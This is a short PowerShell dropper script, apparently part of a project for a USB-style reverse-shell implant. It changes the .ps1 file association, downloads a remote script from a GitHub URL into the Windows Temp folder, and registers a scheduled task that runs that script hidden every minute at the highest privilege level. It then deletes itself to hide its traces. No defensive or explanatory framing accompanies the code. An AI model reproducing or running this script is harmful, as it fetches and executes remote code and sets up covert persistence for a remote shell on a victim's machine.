$dotext = ".ps1"
$extfile = "powershell"
C:\Windows\system32\cmd.exe /c assoc $dotext=$extfile
C:\Windows\system32\cmd.exe /c "ftype $extfile=""C:\Windows\System32\powershell.exe"" ""%1"""

$client = New-Object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')

$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
if($taskExists) {
   Write-Output "EXISTS";
} else {
   Write-Output "Creating task...";
   C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
}

Remove-Item $script:MyInvocation.MyCommand.Path -Force;